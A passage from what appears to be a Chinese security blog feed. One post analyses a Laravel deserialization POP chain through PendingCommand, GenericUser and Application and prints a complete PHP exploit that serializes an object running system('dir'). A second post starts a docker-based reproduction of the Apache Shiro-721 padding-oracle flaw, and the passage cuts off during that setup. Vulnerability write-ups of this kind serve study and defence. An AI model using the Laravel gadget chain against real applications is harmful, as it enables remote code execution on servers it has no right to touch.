class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$exitCode</span> = <span class="hljs-keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="hljs-keyword">$this</span>-&gt;command, <span class="hljs-keyword">$this</span>-&gt;parameters);<br>        &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;getMethodName() == <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;test-&gt;fail(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;getActualArguments()[<span class="hljs-number">0</span>]-&gt;getQuestion().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;expectedExitCode != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;test-&gt;assertTrue(<br>                <span class="hljs-variable">$exitCode</span> == <span class="hljs-keyword">$this</span>-&gt;expectedExitCode,<br>                <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>            );<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure>è¿˜æœ‰å¯ä»¥è§¦å‘runå‡½æ•°çš„ææ„å‡½æ•°<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hasExecuted) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;run();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li>ç®€å•æ€è·¯ æ„é€ ååºåˆ—åŒ–è°ƒç”¨ææ„å‡½æ•°ï¼Œè¿›å…¥runæ–¹æ³•è¿›è¡Œä»£ç æ‰§è¡Œè§‚å¯Ÿrunæ–¹æ³•ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªå‡½æ•°<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br></code></pre></div></td></tr></table></figure>è·Ÿè¿›å‘ç°<br><img src="https://img-blog.csdnimg.cn/20210430125300802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œmokeäº†ä¸€ä¸ªè™šæ‹Ÿçš„å®ä¾‹åŒ–ç±»ç”¨äºè°ƒè¯•è¾“å‡ºï¼Œå…·ä½“å®ç°ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸­é€”å‘ç°æœ‰ä¸ªforeachå¾ªç¯ï¼Œè¿™é‡Œå¯¹$this-&gt;testç±»çš„expectedOutputå±æ€§è¿›è¡Œéå†ä½œä¸ºæ•°ç»„ï¼Œä»£ç æ‰èƒ½æ­£å¸¸æ‰§è¡Œä¸‹å»ã€‚ä½†æ˜¯è¯¥ç±»å¹¶ä¸å­˜åœ¨expectedOutputå±æ€§ï¼›ç»è¿‡åˆ†æä»£ç ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œåªè¦èƒ½å¤Ÿè¿”å›ä¸€ä¸ªæ•°ç»„ä»£ç å°±å¯ä»¥é¡ºåˆ©è¿›è¡Œä¸‹å»ã€‚æ­¤æ—¶å¯ä»¥åˆ©ç”¨åˆ©ç”¨__getæ–¹æ³•ï¼Œå› ä¸ºè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚<br>ç»è¿‡å…¨å±€æœç´¢å‘ç°Illuminate\Auth\GenericUserç±»çš„getæ–¹æ³•å¯åˆ©ç”¨ï¼Œé€šè¿‡geetæ–¹æ³•ä¼ å…¥ä¸€ä¸ªæ•°ç»„å³å¯ä¿è¯åé¢çš„ä»£ç é¡ºåˆ©æ‰§è¡Œ<br><img src="https://img-blog.csdnimg.cn/20210430130551168.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>åé¢çš„ä»£ç éƒ½æ˜¯å¯ä»¥é¡ºåˆ©æ‰§è¡Œä¸‹å»çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆå›åˆ°äº†mockConsoleOutput()æ–¹æ³•å†…ï¼Œæ¥ä¸‹æ¥åˆæ˜¯ä¸€ä¸ªforearchå¾ªç¯ï¼Œå¦‚ä¸Šä¸€æ­¥çš„éå†æ•°ç»„ä¸€æ ·ï¼Œé¡ºåˆ©æ‰§è¡Œä¸‹å»</li><li>æ¥ä¸‹æ¥ä»£ç ä¼šæ‰§è¡Œåˆ°$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);ï¼Œå…¶ä¸­Kernel::classä¸ºå›ºå®šå€¼â€Illuminate\Contracts\Console\Kernelâ€<br>è¿›å…¥makeæ–¹æ³•åçœ‹åˆ°æ­¤æ—¶abstractå‚æ•°æ˜¯Illuminate\Contracts\Http\Kernelç»§ç»­è·Ÿè¿›getAlias<br><img src="https://img-blog.csdnimg.cn/20210430115658207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶ååˆ¤æ–­aliasesä¸­çš„Illuminate\Contracts\Http\Kernelç±»æ˜¯å¦å­˜åœ¨å¹¶è¿”å›è¿™ä¸ªç±»å<br><img src="https://img-blog.csdnimg.cn/20210430120040909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¡ºåˆ©æ‰§è¡Œå®ŒgetAliasåå›åˆ°makeä¸­æœ€åä¼šè°ƒç”¨çˆ¶ç±»ä¸­çš„makeå‡½æ•°ï¼Œè·Ÿè¿›çˆ¶ç±»ä¸­çš„makeå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/20210430120603552.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›resolveå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/20210430120955181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶ä¸­<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-variable">$abstract</span>];=<span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>];<br></code></pre></div></td></tr></table></figure>ä¹Ÿå°±æ˜¯è¿”å›äº†Illuminate\Foundation\Applicationå¯¹è±¡ï¼›å³æˆ‘ä»¬å¯ä»¥å°†ä»»æ„å¯¹è±¡èµ‹å€¼ç»™ $this-&gt;instances[$abstract] ï¼Œè¿™ä¸ªå¯¹è±¡æœ€ç»ˆä¼šèµ‹å€¼ç»™[Kernel::class]æœ€åä¼šè¿›å…¥åˆ°getconcretå‡½æ•°.<br><img src="https://img-blog.csdnimg.cn/20210430120816118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆä¼šåˆ¤æ–­bindingæ•°ç»„ä¸­çš„$abstractæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›$this-&gt;bindings[$abstract][â€˜concreteâ€™]ã€‚æœ€å¤§çš„æ¼æ´å°±å‡ºç°åœ¨è¿™é‡Œï¼Œé€šè¿‡æ•´ä½“è·Ÿè¸ªï¼ŒçŒœæµ‹å¼€å‘è€…çš„æœ¬æ„åº”è¯¥æ˜¯å®ä¾‹åŒ–Illuminate\Contracts\Http\Kernelè¿™ä¸ªç±»ï¼Œä½†æ˜¯åœ¨getConcreteè¿™ä¸ªæ–¹æ³•ä¸­å‡ºäº†é—®é¢˜ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨phpçš„åå°„æœºåˆ¶å®ä¾‹åŒ–ä»»æ„ç±»ã€‚é—®é¢˜å‡ºåœ¨vendor/laravel/framework/src/Illuminate/Container/Container.phpçš„704è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œåˆ¤æ–­$this-&gt;bindings[$abstract])æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›$this-&gt;bindings[$abstract][â€˜concreteâ€™]ã€‚$bindingsæ˜¯vendor/laravel/framework/src/Illuminate/Container/Container.phpæ–‡ä»¶ä¸­Containerç±»ä¸­çš„å±æ€§ã€‚å› æ­¤æˆ‘ä»¬åªè¦å¯»æ‰¾ä¸€ä¸ªç»§æ‰¿è‡ªContainerçš„ç±»ï¼Œå³å¯é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶$this-&gt;bindingså±æ€§ã€‚è€ŒIlluminate\Foundation\Applicationæ°å¥½ç»§æ‰¿è‡ªContainerç±»ï¼Œè¿™å°±æ˜¯é€‰æ‹©Illuminate\Foundation\Applicationå¯¹è±¡æ”¾å…¥$this-&gt;appçš„åŸå› ã€‚ç”±äºæˆ‘ä»¬å·²çŸ¥$abstractå˜é‡ä¸ºIlluminate\Contracts\Console\Kernelï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€é€šè¿‡ååºåˆ—åŒ–å®šä¹‰Illuminate\Foundation\Applicationçš„$bindingså±æ€§å­˜åœ¨é”®åä¸ºIlluminate\Contracts\Console\Kernelçš„äºŒç»´æ•°ç»„å°±èƒ½è¿›å…¥è¯¥åˆ†æ”¯è¯­å¥ï¼Œè¿”å›æˆ‘ä»¬è¦å®ä¾‹åŒ–çš„ç±»åã€‚åœ¨è¿™é‡Œè¿”å›çš„æ˜¯Illuminate\Foundation\Applicationç±»ã€‚<br>æ­¤å¤„å‡ºgetconcreteå‡½æ•°åè¿›å…¥<br><img src="https://img-blog.csdnimg.cn/20210430121550361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›å‘ç°<br><img src="https://img-blog.csdnimg.cn/2021043013102699.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­¤å¤„åˆ¤æ–­$concreteå’Œ$abstractçš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œæ­¤å¤„æ˜¾ç„¶ä¸ä¼šç›¸ç­‰ï¼Œåˆ™è¿›å…¥makeæ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/20210430121839911.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ç¬¬äºŒéå¾ªç¯ä¹‹å$concreteå’Œ$abstractçš„å€¼åˆ™ä¼šç›¸ç­‰ç„¶åè¿›å…¥buildå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/20210430122137724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°buildä¸­ä¼šé€šè¿‡reflectionclassåå°„æœºåˆ¶å®ä¾‹åŒ–æˆ‘ä»¬ä¼ å…¥çš„ç±»ï¼Œæœ€ç»ˆ$this-&gt;app[Kernel::class]è¿”å›çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬åˆ›å»ºçš„Illuminate\Foundation\Applicationç±»çš„å¯¹è±¡ã€‚<br>åœ¨è¿”å›ä¸€ä¸ªå¯¹è±¡ä¹‹åï¼Œåˆè°ƒç”¨äº†callæ–¹æ³•ã€‚å®é™…ä¸ŠIlluminate\Foundation\Applicationç±»æ²¡æœ‰callæ–¹æ³•ï¼Œä½†æ˜¯å®ƒçš„çˆ¶ç±»Illuminate\Container\Containeræ˜¯æœ‰callæ–¹æ³•çš„ã€‚å› æ­¤ï¼Œåœ¨è¿™é‡Œä¼šç›´æ¥è·³è½¬åˆ°Illuminate\Container\Containerç±»ä¸­çš„callæ–¹æ³•ã€‚<br>ä¹‹åè¿›å…¥åˆ°<br><img src="https://img-blog.csdnimg.cn/20210430123738266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶ä¸­isCallableWithAtSign()æ–¹æ³•æ˜¯åˆ¤æ–­ç¡®å®šç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä½¿ç”¨Class@methodè¯­æ³•ï¼Œä¸æ»¡è¶³è‡ªç„¶è·³å‡ºï¼Œæ‰§è¡Œåˆ°callBoundMethodï¼Œè·Ÿè¿›å‘ç°å…¶åªæ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„<br><img src="https://img-blog.csdnimg.cn/20210430123920702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›åé¢çš„åŒ¿åå‡½æ•°åˆ™å¯ä»¥å‘ç°<br><img src="https://img-blog.csdnimg.cn/20210430124243640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸­é—´ä»£ç çœ‹çš„ä¸å¤ªæ‡‚åªç”¨çœ‹æœ€åä¸€è¡Œï¼Œå®ƒå°†æˆ‘ä»¬ä¼ å…¥çš„$parametersæ•°ç»„å’Œ$dependenciesæ•°ç»„åˆå¹¶ï¼Œå…¶ä¸­$dependenciesæ•°ç»„ä¸ºç©ºï¼Œè€Œ$parametersæ•°ç»„æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚æœ€ç»ˆä¹Ÿå°±æ˜¯æ‰§è¡Œäº†<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">call_user_func_array(<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>));<br></code></pre></div></td></tr></table></figure>åˆ°è¿™popé“¾å°±å·²ç»åˆ†æå®Œæˆäº†ï¼ï¼</li></ul><h2 id="æ„é€ ååºåˆ—åŒ–payload"><a href="#æ„é€ ååºåˆ—åŒ–payload" class="headerlink" title="æ„é€ ååºåˆ—åŒ–payload"></a>æ„é€ ååºåˆ—åŒ–payload</h2><p>ç›´æ¥æ”¾expå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Testing</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">PendingCommand</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$parameters</span>,<span class="hljs-variable">$class</span>,<span class="hljs-variable">$app</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;test=<span class="hljs-variable">$class</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;app=<span class="hljs-variable">$app</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">GenericUser</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">attributes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$attributes</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;attributes = <span class="hljs-variable">$attributes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Application</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">hasBeenBootstrapped</span> = <span class="hljs-title">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bind</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;bindings=<span class="hljs-variable">$bind</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title">genericuser</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>\<span class="hljs-title">GenericUser</span>(<br>        <span class="hljs-title">array</span>(<br>            &quot;<span class="hljs-title">expectedOutput</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;<span class="hljs-title">expectedQuestions</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    <span class="hljs-variable">$application</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Application(<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;<br>                <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&quot;concrete&quot;</span>=&gt;<span class="hljs-string">&quot;Illuminate\Foundation\Application&quot;</span><br>                     )<br>             )<br>    );<br>    <span class="hljs-variable">$pendingcommand</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<br>        <span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dir&#x27;</span>),<br>        <span class="hljs-variable">$genericuser</span>,<br>        <span class="hljs-variable">$application</span><br>    );<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pendingcommand</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Shiro ååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2021/04/30/2021-6-26-Shrio721/"/>
    <url>/2021/04/30/2021-6-26-Shrio721/</url>
    
    <content type="html"><![CDATA[<h2 id="Apache-Shiro-ååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-721-CVE-2016-4437ï¼‰"><a href="#Apache-Shiro-ååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-721-CVE-2016-4437ï¼‰" class="headerlink" title="Apache Shiro ååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-721 CVE-2016-4437ï¼‰"></a>Apache Shiro ååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-721 CVE-2016-4437ï¼‰</h2><blockquote><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,å…¶æ”¯æŒèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ç­‰ã€‚ä½¿ç”¨Shiroçš„APIå¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åºã€‚</p><p>2021å¹´02æœˆ01æ—¥ï¼ŒApache Shiroå‘å¸ƒ1.7.1ç‰ˆæœ¬ï¼Œä¿®å¤äº† Apache Shiro ä¸­çš„ä¸€ä¸ªèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-17523ï¼‰ã€‚å½“Apache Shiroä¸Springç»“åˆä½¿ç”¨æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ¶æ„HTTPè¯·æ±‚æ¥ç»•è¿‡Shiroçš„èº«ä»½è®¤è¯ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ï¼ŒæˆåŠŸè®¿é—®åå°ã€‚</p></blockquote><blockquote><p>Apache Shiro å­˜åœ¨é«˜å±ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºApache Shiro cookieä¸­é€šè¿‡ AES-128-CBC æ¨¡å¼åŠ å¯†çš„rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨æˆ·å¯é€šè¿‡Padding Oracle åŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p></blockquote><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>å¤ç°ç¯å¢ƒ: Apache Shiro 1.4.1 + tomcat:8-jre8<br>gitä¸‹è½½shiro-720åˆ°æœ¬åœ°ç¯å¢ƒ</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndz/</span>Shiro-<span class="hljs-number">721</span>.git<br></code></pre></div></td></tr></table></figure><p>å¯¹shiro-720è¿›è¡Œç¼–è¯‘</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">Shiro-721/Docker</span><br><span class="hljs-keyword">docker </span><span class="hljs-keyword">build </span>-t <span class="hljs-keyword">shiro-721 </span>.<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620132903892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯åŠ¨dokcerå¹¶å°†ç«¯å£8080æ˜ å°„åˆ°ä¸»æœºç«¯å£9000ä¸Š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">9000</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></div></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦æ­å»ºæˆåŠŸ</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133006473.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="é€šè¿‡è‡ªè¡Œç¼–è¯‘1-4-1war-åŒ…æ”¾å…¥tomcatå®¹å™¨ä¸­è¿è¡Œ"><a 